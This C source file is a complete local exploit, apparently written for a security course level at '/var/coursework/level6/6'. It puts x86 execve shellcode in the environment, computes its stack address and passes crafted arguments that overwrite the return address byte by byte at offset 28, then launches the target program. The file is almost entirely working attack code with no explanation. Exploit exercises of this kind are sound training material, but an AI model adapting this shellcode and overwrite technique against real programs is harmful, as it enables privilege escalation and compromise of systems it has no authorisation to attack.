#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <ctype.h>

#define VULN "/var/coursework/level6/6"

char shellcode[] = "\xeb\x15\x5b\x31\xc0\x88\x43\x14\x89\x5b\x15\x89\x43\x19\x8d\x4b\x15"
"\x89\xc2\xb0\x0b\xcd\x80\xe8\xe6\xff\xff\xff/usr/local/bin/pwn3d";

int main() {
    unsigned int addr = 0xc0000000 - 4 - strlen(VULN) - 1 - strlen(shellcode) - 1;
    unsigned char b1 = (addr) & 0xff;
    unsigned char b2 = (addr >> 8) & 0xff;
    unsigned char b3 = (addr >> 16) & 0xff;
    unsigned char b4 = (addr >> 24) & 0xff;

    // offset
    int retOffset = 28;

    char *cmdParam1 = "-1";
    char *cmdParam2 = malloc(3);
    char *cmdParam3 = malloc(3);
    char *cmdParam4 = malloc(3);
    char *cmdParam5 = malloc(3);
    if (!cmdParam2 || !cmdParam3 || !cmdParam4 || !cmdParam5) { perror("malloc"); exit(1); }

    sprintf(cmdParam2, "%c%d", b1, retOffset);
    sprintf(cmdParam3, "%c%d", b2, retOffset + 1);
    sprintf(cmdParam4, "%c%d", b3, retOffset + 2);
    sprintf(cmdParam5, "%c%d", b4, retOffset + 3);

    char *progWithParameters[] = {VULN, cmdParam1, cmdParam2, cmdParam3, cmdParam4, cmdParam5, NULL};
    char *envp[] = {shellcode, NULL};

    void print_arg_hex(int idx, const char *s) {
        size_t len = strlen(s);
        printf("progWithParameters[%d]:", idx);
        for (size_t j = 0; j < len; ++j) {
            unsigned char byte = (unsigned char)s[j];
            printf(" %02x(%c)", byte, isprint(byte) ? byte : '.');
        }
    printf("\n");
    }

    for (int i=0; progWithParameters[i]; ++i)
    print_arg_hex(i, progWithParameters[i]);
//    printf("progWithParameters[%d]=%s\n", i, progWithParameters[i]);

    printf("=== Exploit Info ===\n");
    printf("length = 65535 (0xFFFF)\n");
    printf("buffersize = 0\n");
    printf("offset = %d\n", retOffset);
    printf("shellcode address = 0x%x\n", addr);

    execve(progWithParameters[0], progWithParameters, envp);
    return 0;
}
